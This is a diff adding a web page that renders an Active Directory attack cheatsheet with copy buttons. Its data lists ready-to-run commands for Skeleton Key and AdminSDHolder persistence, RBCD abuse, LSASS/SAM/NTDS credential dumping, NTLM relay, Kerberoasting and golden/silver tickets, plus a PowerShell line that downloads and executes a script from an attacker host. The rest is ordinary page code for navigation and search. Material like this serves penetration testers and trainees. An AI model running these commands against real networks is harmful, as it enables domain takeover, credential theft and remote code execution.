+              { label: 'Use Ticket', cmd: 'export KRB5CCNAME=Administrator.ccache\nimpacket-psexec DOMAIN/Administrator@<DC> -k -no-pass' }
+            ]
+          },
+          {
+            title: 'Skeleton Key',
+            objective: 'Inject a master password for all users',
+            commands: [
+              { label: 'Mimikatz', cmd: 'mimikatz.exe "privilege::debug" "misc::skeleton" exit' },
+              { label: 'Usage', cmd: 'net use \\\\<DC>\\c$ /user:Administrator mimikatz' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'persistence',
+        title: 'Persistence',
+        icon: 'life-buoy',
+        content: [
+          {
+            title: 'AdminSDHolder Abuse',
+            objective: 'Maintain persistence via protected groups',
+            commands: [
+              { label: 'Add Rights', cmd: 'Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=COM" -PrincipalIdentity USERNAME -Rights All' }
+            ]
+          },
+          {
+            title: 'Machine Account Abuse',
+            objective: 'Create backdoors via computer accounts',
+            commands: [
+              { label: 'Add Computer', cmd: "impacket-addcomputer DOMAIN/USERNAME:'PASSWORD' -method LDAPS -computer-name FAKE$ -computer-pass 'Password123'" },
+              { label: 'RBCD Configure', cmd: "impacket-rbcd DOMAIN/USERNAME:'PASSWORD' -delegate-from FAKE$ -delegate-to TARGET_COMPUTER$ -dc-ip <DC_IP>" }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'tools',
+        title: 'Tools',
+        icon: 'wrench',
+        theme: 'red',
+        content: [
+          {
+            title: 'NetExec/CrackMapExec',
+            objective: 'Network enumeration and exploitation',
+            commands: [
+              { label: 'SMB scan', cmd: 'nxc smb <TARGETS> ' },
+              { label: 'SMB null scan', cmd: 'nxc smb <TARGETS> -u "" -p "" --continue-on-success' },
+              { label: 'List Users In Domain', cmd: 'nxc smb <TARGETS> -u "" -p "" --users' },
+              { label: 'Password Spray', cmd: 'nxc smb <TARGETS> -u UserList.txt -p Password123 --continue-on-success' },
+              { label: 'Pass-The-Hash', cmd: 'nxc smb <TARGETS> -u USER -H HASH' },
+              { label: 'List All Modules', cmd: 'nxc smb -L' },
+              { label: 'Retrieve LAPS Password', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M laps' },
+              { label: 'Dump Local SAM Hashes', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD --sam' },
+              { label: 'Extract LSA Secrets', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD --lsa' },
+              { label: 'Extract WinSCP Configuration Files', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M winscp' },
+              { label: 'Retrieve Winlogon Registration Data', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M reg-winlogon' },
+              { label: 'Dump DPAPI Password Credentials', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M dpapi' },
+              { label: 'Extract Credentials from LSASS', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M lsassy' },
+              { label: 'Dumping LSASS Memory with nanodump Module', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M nanodump' },
+              { label: 'Extract Notepad++ Session Logs', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M notepad++' },
+              { label: 'Retrieve PowerShell Command History', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M powershell_history' },
+              { label: 'Dumping NTDS.dit Using an Authenticated User', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD --ntds' },
+              { label: 'Custom Module', cmd: 'nxc smb <TARGETS> -u USER -p PASSWORD -M <CUSTOM_MODULE>' },
+            ]
+          },
+          {
+            title: 'Impacket',
+            objective: 'Network protocols toolkit',
+            commands: [
+              { label: 'GetADUsers (List Domain Users)', cmd: 'impacket-GetADUsers DOMAIN/USER:PASSWORD -dc-ip <DC_IP> -all' },
+              { label: 'GetADUsers (Pass-the-hash)', cmd: 'impacket-GetADUsers -hashes :NTLM_HASH DOMAIN/USER -dc-ip <DC_IP> -all' },
+              { label: 'PsExec (with credentials)', cmd: 'impacket-psexec DOMAIN/USER:PASSWORD@TARGET' },
+              { label: 'PsExec (Pass-the-hash)', cmd: 'impacket-psexec -hashes :NTLM_HASH DOMAIN/USER@TARGET' },
+              { label: 'PsExec (Execute command)', cmd: 'impacket-psexec DOMAIN/USER@TARGET "whoami"' },
+              { label: 'SecretsDump (Dump SAM, SECURITY, LSA secrets)', cmd: 'impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET' },
+              { label: 'SecretsDump (dump domain credentials)', cmd: 'impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET -just-dc' },
+              { label: 'SecretsDump (Dump specific user)', cmd: 'impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET -just-dc-user krbtgt' },
+              { label: 'GetNPUsers (AS-REP Roastable User Enumeration)', cmd: 'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip <DC_IP>' },
+              { label: 'GetNPUsers (AS-REP Roasting without Credentials)', cmd: 'impacket-GetNPUsers DOMAIN/ -usersfile user.txt -dc-ip <DC_IP> -request -format hashcat' },
+              { label: 'GetNPUsers (AS-REP Roasting with Credentials)', cmd: 'impacket-GetNPUsers DOMAIN/USER:PASSWORD -dc-ip <DC_IP> -request -format hashcat' },
+              { label: 'GetUserSPNs (Kerberoastable User Enumeration)', cmd: 'impacket-GetUserSPNs DOMAIN/USER:PASSWORD' },
+              { label: 'GetUserSPNs (Kerberoasting)', cmd: 'impacket-GetUserSPNs DOMAIN/USER:PASSWORD -request' }
+            ]
+          },
+
+          {
+            title: 'Responder',
+            objective: 'LLMNR/NBT-NS/WPAD Poisoner and Relay Attacks',
+            commands: [
+              { label: 'Responder', cmd: 'responder -I eth0 -dwv' },
+              { label: 'SMB Relay', cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support -i' }
+            ]
+          },
+          {
+            title: 'BloodHound',
+            objective: 'AD Relationship Graph',
+            commands: [
+              { label: 'BloodHound-Python', cmd: 'bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c All --zip' },
+              { label: 'SharpHound', cmd: 'SharpHound.exe -c All' }
+            ]
+          },
+          {
+            title: 'Mimikatz',
+            objective: 'Credential Dumping',
+            commands: [
+              { label: 'Check User Has Sufficient Permissions', cmd: 'privilege::debug' },
+              { label: 'Impersonates SYSTEM token', cmd: 'token::elevate' },
+              { label: 'Dump SAM Database', cmd: 'lsadump::sam' },
+              { label: 'Dump LSA Secrets', cmd: 'lsadump::secrets' },
+              { label: 'Extract All Credentials from LSASS', cmd: 'sekurlsa::logonpasswords' },
+              { label: 'Extract Kerberos tickets', cmd: 'sekurlsa::tickets' },
+              { label: 'Export Kerberos tickets', cmd: 'sekurlsa::tickets /export' },
+              { label: 'Pass-the-Hash', cmd: 'sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe' },
+              { label: 'Pass-the-Ticket', cmd: 'kerberos::ptt <ticket_file>' },
+              { label: 'Extract Kerberos encryption keys', cmd: 'sekurlsa::ekeys' },
+              { label: 'Lists cached Kerberos tickets', cmd: 'kerberos::list' },
+              { label: 'Dumps Kerberos tickets', cmd: 'lsadump::kerberos' },
+              { label: 'Dumps Domain, username, and NTLM HASH', cmd: 'lsadump::lsa /inject /name:krbtgt' },
+              { label: 'Creates Golden Ticket', cmd: 'kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500' },
+              { label: 'Creates Silver Ticket', cmd: 'kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<service_hash>' },
+              { label: 'DCSync Attack', cmd: 'lsadump::dcsync /user:<domain>\<username>' },
+            ]
+          },
+          {
+            title: 'Metasploit-framework',
+            objective: 'Common Metasploit auxiliary and exploit modules for AD',
+            commands: [
+              { label: 'SMB protocol version', cmd: 'use auxiliary/scanner/smb/smb_version' },
+              { label: 'Enumerate DNS records', cmd: 'use auxiliary/gather/enum_dns' },
+              { label: 'Gain Shell with PsExec', cmd: 'use exploit/windows/smb/psexec' },
+              { label: 'Detect EternalBlue', cmd: 'use auxiliary/scanner/smb/smb_ms17_010' },
+            ]
+          },
+          {
+            title: 'Powerview - Domain and Forest Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Current domain info', cmd: 'Get-Domain' },
+              { label: 'Specific domain info', cmd: 'Get-Domain -domain <domain>' },
+              { label: 'Forest info', cmd: 'Get-Forest' },
+              { label: 'All domains in the forest', cmd: 'Get-ForestDomain' },
+              { label: 'Retrieves domain SID', cmd: 'Get-DomainSID' },
+              { label: 'list all domain controllers', cmd: 'Get-DomainController' },
+              { label: 'list all domain trusts', cmd: 'Get-DomainTrust' },
+            ]
+          },
+          {
+            title: 'Powerview - User Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Lists all users in Domain', cmd: 'Get-DomainUser' },
+              { label: 'Specific user info', cmd: 'Get-DomainUser -Identity USERNAME' },
+              { label: 'List users with specific properties', cmd: 'Get-DomainUser -Properties *' },
+              { label: 'kerberostable users', cmd: 'Get-DomainUser -SPN' },
+              { label: 'Finds privileged accounts', cmd: 'Get-DomainUser -AdminCount' },
+              { label: 'Finds AS-REP roasting users', cmd: 'Get-DomainUser -PreauthNotRequired' },
+              { label: 'Find delegation accounts', cmd: 'Get-DomainUser -TrustedToAuth' },
+              { label: 'Find passwords in description fields', cmd: 'Get-DomainUser -LDAPFilter "(description=*password*)"' },
+              { label: 'Find accounts with password set to never expire', cmd: 'Get-DomainUser -NeverExpires' },
+            ]
+          },
+          {
+            title: 'Powerview - Group Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Lists all groups', cmd: 'Get-DomainGroup' },
+              { label: 'Specific group info', cmd: 'Get-DomainGroup -Identity "GROUPNAME"' },
+              { label: 'List groups with specific properties', cmd: 'Get-DomainGroup -Properties *' },
+              { label: 'List Members of group', cmd: 'Get-DomainGroupMember -Identity "Domain Admins"' },
+              { label: 'Privileged groups', cmd: 'Get-DomainGroup -AdminCount' },
+              { label: 'Groups a user belongs to', cmd: 'Get-DomainGroup -MemberIdentity USERNAME' },
+            ]
+          },
+          {
+            title: 'Powerview - Computer Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Lists all computers', cmd: 'Get-DomainComputer' },
+              { label: 'Find alive hosts', cmd: 'Get-DomainComputer -Ping' },
+              { label: 'Find servers', cmd: 'Get-DomainComputer -OperatingSystem "*Server*"' },
+              { label: 'Delegation computers', cmd: 'Get-DomainComputer -TrustedToAuth' },
+              { label: 'Find unconstrained delegation', cmd: 'Get-DomainComputer -Unconstrained' },
+              { label: 'Find computers with specific properties', cmd: 'Get-DomainComputer -Properties *' },
+              { label: 'Get IP addresses', cmd: 'Get-DomainComputer -Properties IPv4Address' },
+            ]
+          },
+          {
+            title: 'Powerview - GPO Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Lists all GPOs', cmd: 'Get-DomainGPO' },
+              { label: 'Specific GPO info', cmd: 'Get-DomainGPO -Identity "GPO_NAME"' },
+              { label: 'Finds local admin rights via GPO', cmd: 'Get-DomainGPOLocalGroup' },
+              { label: 'Finds where users are local admins', cmd: 'Get-DomainGPOUserLocalGroupMapping' },
+              { label: 'Computer admin mapping', cmd: 'Get-DomainGPOComputerLocalGroupMapping' },
+            ]
+          },
+          {
+            title: 'Powerview - ACLs',
+            objective: '',
+            commands: [
+              { label: 'ACL of object', cmd: 'Get-DomainObjectAcl -Identity <object>' },
+              { label: 'Human readable ACL', cmd: 'Get-DomainObjectAcl -ResolveGUIDs' },
+              { label: 'Enumerate ACLs across domain', cmd: 'Get-DomainObjectAcl -SearchBase "DC=domain,DC=local"' },
+              { label: 'Finds exploitable ACLs', cmd: 'Find-InterestingDomainAcl' },
+              { label: 'ACLs on user', cmd: 'Get-ObjectAcl -SamAccountName USERNAME -ResolveGUIDs' },
+            ]
+          },
+          {
+            title: 'Powerview - Kerberos Attack Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Kerberoasting targets', cmd: 'Get-DomainUser -SPN' },
+              { label: 'AS-REP roast targets', cmd: 'Get-DomainUser -PreauthNotRequired' },
+              { label: 'Delegation abuse targets', cmd: 'Get-DomainComputer -TrustedToAuth' },
+              { label: 'Unconstrained delegation targets', cmd: 'Get-DomainComputer -Unconstrained' },
+            ]
+          },
+          {
+            title: 'Powerview - Network/shares Enumeration',
+            objective: '',
+            commands: [
+              { label: 'Finds accessible shares', cmd: 'Invoke-ShareFinder' },
+              { label: 'Searches for sensitive files', cmd: 'Invoke-FileFinder' },
+              { label: 'Enumerate local admins', cmd: 'Invoke-EnumerateLocalAdmin' },
+            ]
+          },
+          {
+            title: 'PowerShell',
+            objective: 'Helpful native PowerShell scripts/commands',
+            commands: [
+              { label: 'Bypass Execution Policy', cmd: 'powershell -ep bypass' },
+              { label: 'Download and Execute', cmd: 'IEX(New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/script.ps1")' },
+              { label: 'Enumerate Local Admins', cmd: 'Get-LocalGroupMember -Group "Administrators"' },
+              { label: 'Check for AD Module', cmd: 'Get-Module -ListAvailable ActiveDirectory' },
+              { label: 'List AD Users (ADSI)', cmd: '([adsisearcher]"(&(objectCategory=User))").FindAll()' },
+              { label: 'List AD Groups (ADSI)', cmd: '([adsisearcher]"(&(objectCategory=Group))").FindAll()' },
+              { label: 'Test Port Connectivity', cmd: 'Test-NetConnection -ComputerName <TARGET_IP> -Port 445' },
+              { label: 'Search for Passwords in Files', cmd: 'grep -r "password" C:\\Users\\' },
+              { label: 'List Current User Privileges', cmd: 'whoami /all' },
+              { label: 'Show Network Connections', cmd: 'Get-NetTCPConnection -State Established' }
+            ]
+          },
+          {
+            title: 'Rubeus',
+            objective: 'C#-based tool designed for Windows to interact with Kerberos. ',
+            commands: [
+              { label: 'Triage current tickets', cmd: 'Rubeus.exe triage' },
+              { label: 'Dump tickets', cmd: 'Rubeus.exe dump' },
+              { label: 'Kerberoast', cmd: 'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt' },
+              { label: 'AS-REP Roast', cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt' },
+              { label: 'Pass-the-Ticket (PTT)', cmd: 'Rubeus.exe ptt /ticket:<ticket_file>' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'recovery',
+        title: 'Stuck? Try these',
+        icon: 'life-buoy',
+        content: [
+          {
+            title: '',
+            type: 'card',
+            objective: 'Tips for when you run out of ideas',
+            list: [
+              "Enumerate more users (CME, Impacket)",
+              "Check your current privileges (whoami /all)",
+              "Run BloodHound analysis again",
+              "Check for Kerberos abuse (AS-REP Roasting)",
+              "Try lateral movement with current credentials to new subnets",
+              "Password spray found hashes",
+              "Check for writable shares (SYSVOL, NETLOGON)",
+              "If you have local admin, dump LSASS again"
+            ]
+          }
+        ]
+      }
+    ];
+
+    let searchQuery = '';
+    let isSidebarOpen = false;
+    let expandedSections = new Set([CHEATSHEET_DATA[0].id]);
+    let activeSectionId = CHEATSHEET_DATA[0].id;
+    let activeSubSectionId = null;
+
+    const sidebarEl = document.getElementById('sidebar');
+    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+    const navContainer = document.getElementById('nav-container');
+    const contentContainer = document.getElementById('content-container');
+    const emptyStateEl = document.getElementById('empty-state');
+    const searchInput = document.getElementById('search-input');
+
+    function escapeHtml(text) {
+      if (!text) return '';
+      return text
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    function copyToClipboard(text, btnElement) {
+      navigator.clipboard.writeText(text).then(() => {
+        const icon = btnElement.querySelector('i');
+        icon.setAttribute('data-lucide', 'check');
+        icon.classList.add('text-emerald-500');
+        lucide.createIcons();
+
+        setTimeout(() => {
+          icon.setAttribute('data-lucide', 'copy');
+          icon.classList.remove('text-emerald-500');
+          lucide.createIcons();
+        }, 2000);
+      });
+    }
+
+    function renderCodeBlock(label, code, theme = 'hacker') {
+      const safeCode = escapeHtml(code);
+      const labelHtml = label ? `<div class="text-xs font-semibold text-${theme}-400 mb-1 uppercase tracking-wider">${escapeHtml(label)}</div>` : '';
+
+      return `
+    <div class="my-3 group">
+      ${labelHtml}
+      <div class="relative bg-dark-bg border border-dark-border rounded-md overflow-hidden">
+        <div class="absolute right-2 top-2 opacity-0 group-hover:opacity-100 transition-opacity">
+          <button
+            onclick="copyToClipboard(decodeURIComponent('${encodeURIComponent(code)}'), this)"
+            class="p-1.5 rounded-md bg-zinc-800 hover:bg-zinc-700 text-zinc-400 hover:text-white transition-colors"
+            title="Copy command"
+          >
+            <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+          </button>
+        </div>
+        <pre class="p-4 overflow-x-auto text-sm font-mono leading-relaxed text-zinc-300 whitespace-pre-wrap break-all"><code class="language-bash">${safeCode}</code></pre>
+      </div>
+    </div>
+  `;
+    }
+
+    function getSubSectionId(parentId, index) {
+      return `sub-${parentId}-${index}`;
+    }
+
+    function renderSubSection(sub, parentId, index, theme = 'hacker') {
+      const subId = getSubSectionId(parentId, index);
+
+      const wrapperStart = `<div id="${subId}" class="sub-scroll-mt mb-8 group/item">`;
+      const wrapperEnd = `</div>`;
+
+      const objectiveHtml = sub.objective
+        ? `<div class="mb-3 text-xs flex items-center text-zinc-500 font-medium">
+         <span class="bg-zinc-800 text-zinc-400 px-1.5 py-0.5 rounded border border-zinc-700 mr-2 font-mono text-[10px]">OBJ</span> 
+         ${escapeHtml(sub.objective)}
+       </div>`
+        : '';
+
+      if (sub.type === 'workflow') {
+        const commandsHtml = sub.commands ? sub.commands.map(c => renderCodeBlock(c.label, c.cmd, theme)).join('') : '';
+        const notesHtml = sub.notes ? `<div class="mt-3 text-sm text-yellow-500/80 italic"><strong>Note:</strong> ${sub.notes.join(' ')}</div>` : '';
+
+        return `
+      ${wrapperStart}
+      <div class="bg-zinc-900/50 border border-l-4 border-l-${theme}-500 border-zinc-800 rounded-lg p-5 shadow-sm hover:border-zinc-700 transition-colors">
+        <h3 class="text-lg font-bold text-white mb-2 flex items-center">
+          <i data-lucide="terminal" class="mr-2 text-${theme}-500 w-4.5 h-4.5"></i>
+          ${escapeHtml(sub.title)}
+        </h3>
+        ${objectiveHtml}
+        ${sub.description ? `<p class="text-zinc-400 mb-4">${escapeHtml(sub.description)}</p>` : ''}
+        ${commandsHtml}
+        ${notesHtml}
+      </div>
+      ${wrapperEnd}
+    `;
+      }
+
+      if (sub.type === 'card') {
+        const listHtml = sub.list ? `
+      <ul class="space-y-2">
+        ${sub.list.map(item => `
+          <li class="flex items-start text-zinc-300 text-sm">
+            <i data-lucide="chevron-right" class="text-${theme}-500 mr-2 mt-0.5 flex-shrink-0 w-4 h-4"></i>
+            <span>${escapeHtml(item)}</span>
+          </li>
+        `).join('')}
+      </ul>
+    ` : '';
+
+        return `
+      ${wrapperStart}
+      <div class="bg-zinc-900 border border-zinc-800 rounded-lg p-5">
+        <h3 class="text-lg font-semibold text-white mb-2 border-b border-zinc-800 pb-2">${escapeHtml(sub.title)}</h3>
+        ${objectiveHtml}
+        <div class="mt-2">
+            ${listHtml}
+        </div>
+      </div>
+      ${wrapperEnd}
+    `;
+      }
+
+      const commandsHtml = sub.commands ? `<div class="space-y-2">${sub.commands.map(c => renderCodeBlock(c.label, c.cmd, theme)).join('')}</div>` : '';
+      const listHtml = sub.list ? `
+    <ul class="mt-3 space-y-1">
+      ${sub.list.map(item => `
+        <li class="flex items-center text-zinc-400 text-sm">
+          <div class="w-1.5 h-1.5 rounded-full bg-${theme}-600 mr-2"></div>
+          ${escapeHtml(item)}
+        </li>
+      `).join('')}
+    </ul>
+  ` : '';
+
+      return `
+    ${wrapperStart}
+      <h3 class="text-lg font-semibold text-${theme}-300 mb-2 flex items-center">
+        ${escapeHtml(sub.title)}
+      </h3>
+      ${objectiveHtml}
+      ${sub.description ? `<p class="text-sm text-zinc-400 mb-3">${escapeHtml(sub.description)}</p>` : ''}
+      ${commandsHtml}
+      ${listHtml}
+    ${wrapperEnd}
+  `;
+    }
+
+    function renderSection(section) {
+      const theme = section.theme || 'hacker';
+      const contentHtml = section.content.map((sub, index) => renderSubSection(sub, section.id, index, theme)).join('');
+
+      return `
+    <div id="${section.id}" class="section-container scroll-mt-24 mb-16">
+      <div class="flex items-center mb-6">
+        <h2 class="text-2xl font-bold text-white tracking-tight">${escapeHtml(section.title)}</h2>
+        <div class="h-px bg-zinc-800 flex-grow ml-4"></div>
+      </div>
+      <div class="grid grid-cols-1 gap-4">
+        ${contentHtml}
+      </div>
+    </div>
+  `;
+    }
+
+    function renderNavTree() {
+      navContainer.innerHTML = CHEATSHEET_DATA.map(section => {
+        const baseClasses = "w-full text-left px-3 py-2 rounded-md text-sm font-medium transition-all duration-200 flex items-center justify-between group nav-main-item";
+
+        const subItemsHtml = section.content.map((sub, idx) => {
+          const subId = getSubSectionId(section.id, idx);
+          const subBaseClass = "block w-full text-left px-2 py-1.5 text-xs rounded-md transition-colors truncate text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800/50 nav-sub-item";
+
+          return `
+            <button 
+                id="nav-link-${subId}"
+                onclick="scrollToSubSection('${subId}', event)"
+                class="${subBaseClass}"
+                data-parent="${section.id}"
+                title="${escapeHtml(sub.title)}"
+            >
+                ${escapeHtml(sub.title)}
+            </button>
+        `;
+        }).join('');
+
+        return `
+      <div class="mb-1">
+        <button
+            id="nav-btn-${section.id}"
+            onclick="handleMainSectionClick('${section.id}')"
+            class="${baseClasses}"
+            data-section="${section.id}"
+        >
+            <div class="flex items-center">
+                <i data-lucide="${section.icon || 'terminal'}" class="nav-icon mr-3 w-4 h-4 text-zinc-600 group-hover:text-zinc-400 transition-colors"></i>
+                <span class="nav-text text-zinc-400 group-hover:text-white transition-colors">${escapeHtml(section.title)}</span>
+            </div>
+            <i data-lucide="chevron-right" class="nav-chevron w-3 h-3 text-zinc-600 transition-transform duration-300"></i>
+        </button>
+        
+        <div id="nav-wrapper-${section.id}" class="nav-submenu-wrapper">
+            <div class="nav-submenu-inner ml-4 pl-3 border-l border-zinc-800 space-y-0.5 my-1">
+                ${subItemsHtml}
+            </div>
+        </div>
+      </div>
+    `;
+      }).join('');
+      lucide.createIcons();
+    }
+
+    function updateNavState() {
+      CHEATSHEET_DATA.forEach(section => {
+        const isActive = section.id === activeSectionId;
+        const isExpanded = expandedSections.has(section.id);
+        const theme = section.theme || 'hacker';
+
+        const btn = document.getElementById(`nav-btn-${section.id}`);
+        const wrapper = document.getElementById(`nav-wrapper-${section.id}`);
+        const icon = btn.querySelector('.nav-icon');
+        const text = btn.querySelector('.nav-text');
+        const chevron = btn.querySelector('.nav-chevron');
+
+        if (isActive) {
+          btn.classList.add('bg-zinc-800/50');
+          text.classList.replace('text-zinc-400', 'text-white');
+          icon.classList.add(`text-${theme}-500`);
+          icon.classList.remove('text-zinc-600', 'group-hover:text-zinc-400');
+        } else {
+          btn.classList.remove('bg-zinc-800/50');
+          text.classList.replace('text-white', 'text-zinc-400');
+          icon.classList.remove(`text-${theme}-500`);
+          icon.classList.add('text-zinc-600', 'group-hover:text-zinc-400');
+        }
+
+        if (isExpanded) {
+          wrapper.classList.add('expanded');
+          chevron.classList.add('rotate-90');
+        } else {
+          wrapper.classList.remove('expanded');
+          chevron.classList.remove('rotate-90');
+        }
+
+        section.content.forEach((sub, idx) => {
+          const subId = getSubSectionId(section.id, idx);
+          const subBtn = document.getElementById(`nav-link-${subId}`);
+
+          if (subBtn) {
+            if (subId === activeSubSectionId) {
+              subBtn.classList.add(`text-${theme}-400`, `bg-${theme}-500/10`, 'font-medium');
+              subBtn.classList.remove('text-zinc-500', 'hover:text-zinc-300', 'hover:bg-zinc-800/50');
+            } else {
+              subBtn.classList.remove(`text-${theme}-400`, `bg-${theme}-500/10`, 'font-medium');
+              subBtn.classList.add('text-zinc-500', 'hover:text-zinc-300', 'hover:bg-zinc-800/50');
+            }
+          }
+        });
+      });
+    }
+
+    function renderContent() {
+      const query = searchQuery.toLowerCase();
+
+      const filteredData = CHEATSHEET_DATA.map(section => {
+        const matchesTitle = section.title.toLowerCase().includes(query);
+        const matchedContent = section.content.filter(sub =>
+          sub.title.toLowerCase().includes(query) ||
+          (sub.description && sub.description.toLowerCase().includes(query)) ||
+          (sub.objective && sub.objective.toLowerCase().includes(query)) ||
+          (sub.commands && sub.commands.some(c => c.cmd.toLowerCase().includes(query) || (c.label && c.label.toLowerCase().includes(query))))
+        );
+
+        if (matchesTitle || matchedContent.length > 0) {
+          return {
+            ...section,
+            content: matchesTitle ? section.content : matchedContent
+          };
+        }
+        return null;
+      }).filter(Boolean);
+
+      if (filteredData.length === 0) {
+        contentContainer.innerHTML = '';
+        emptyStateEl.classList.remove('hidden');
+      } else {
+        emptyStateEl.classList.add('hidden');
+        contentContainer.innerHTML = filteredData.map(renderSection).join('');
+      }
+      lucide.createIcons();
+    }
+
+    function handleMainSectionClick(id) {
+      if (expandedSections.has(id)) {
+        if (activeSectionId === id) {
+          expandedSections.delete(id);
+        } else {
+          activeSectionId = id;
+          scrollToSection(id);
+        }
+      } else {
+        expandedSections.clear();
+        expandedSections.add(id);
+        activeSectionId = id;
+        scrollToSection(id);
+      }
+      updateNavState();
+    }
+
+    function scrollToSection(id) {
+      const element = document.getElementById(id);
+      if (element) {
+        const offset = 80;
+        const elementPosition = element.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - offset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: "smooth"
+        });
+
+        if (window.innerWidth < 1024) {
+          toggleSidebar(false);
+        }
+      }
+    }
+
+    function scrollToSubSection(subId, event) {
+      event.stopPropagation();
+      const element = document.getElementById(subId);
+      if (element) {
+        const offset = 100;
+        const elementPosition = element.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - offset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: "smooth"
+        });
+
+        if (window.innerWidth < 1024) {
+          toggleSidebar(false);
+        }
+      }
+    }
+
+    function toggleSidebar(show) {
+      isSidebarOpen = typeof show === 'boolean' ? show : !isSidebarOpen;
+
+      if (isSidebarOpen) {
+        sidebarEl.classList.remove('-translate-x-full');
+        mobileMenuBtn.innerHTML = '<i data-lucide="x" class="w-6 h-6"></i>';
+      } else {
+        sidebarEl.classList.add('-translate-x-full');
+        mobileMenuBtn.innerHTML = '<i data-lucide="menu" class="w-6 h-6"></i>';
+      }
+      lucide.createIcons();
+    }
+
+    mobileMenuBtn.addEventListener('click', () => toggleSidebar());
+
+    searchInput.addEventListener('input', (e) => {
+      searchQuery = e.target.value;
+      renderContent();
+    });
+
+    let isScrolling = false;
+    let scrollTimeout;
+
+    function handleScroll() {
+      if (isScrolling) return;
+
+      const scrollPosition = window.scrollY + 150;
+      let newActiveId = CHEATSHEET_DATA[0].id;
+      let newActiveSubId = null;
+
+      for (let i = CHEATSHEET_DATA.length - 1; i >= 0; i--) {
+        const section = CHEATSHEET_DATA[i];
+        const sectionEl = document.getElementById(section.id);
+
+        if (sectionEl && sectionEl.offsetTop <= scrollPosition) {
+          newActiveId = section.id;
+
+          for (let j = 0; j < section.content.length; j++) {
+            const subId = getSubSectionId(section.id, j);
+            const subEl = document.getElementById(subId);
+            if (subEl && subEl.offsetTop <= (scrollPosition + 100)) {
+              newActiveSubId = subId;
+            }
+          }
+          break;
+        }
+      }
+
+      let stateChanged = false;
+
+      if (activeSectionId !== newActiveId) {
+        activeSectionId = newActiveId;
+
+        if (!expandedSections.has(newActiveId)) {
+          expandedSections.clear();
+          expandedSections.add(newActiveId);
+        }
+        stateChanged = true;
+      }
+
+      if (activeSubSectionId !== newActiveSubId) {
+        activeSubSectionId = newActiveSubId;
+        stateChanged = true;
+      }
+
+      if (stateChanged) {
+        updateNavState();
+      }
+    }
+
+    window.addEventListener('scroll', () => {
+      if (scrollTimeout) clearTimeout(scrollTimeout);
+      scrollTimeout = setTimeout(handleScroll, 20);
+    });
+
+    renderContent();
+    renderNavTree();
+    updateNavState();
+    lucide.createIcons();
+    window.copyToClipboard = copyToClipboard;
+    window.scrollToSection = scrollToSection;
+    window.scrollToSubSection = scrollToSubSection;
+    window.handleMainSectionClick = handleMainSectionClick;
+
+  </script>
+</body>
+
+</html>
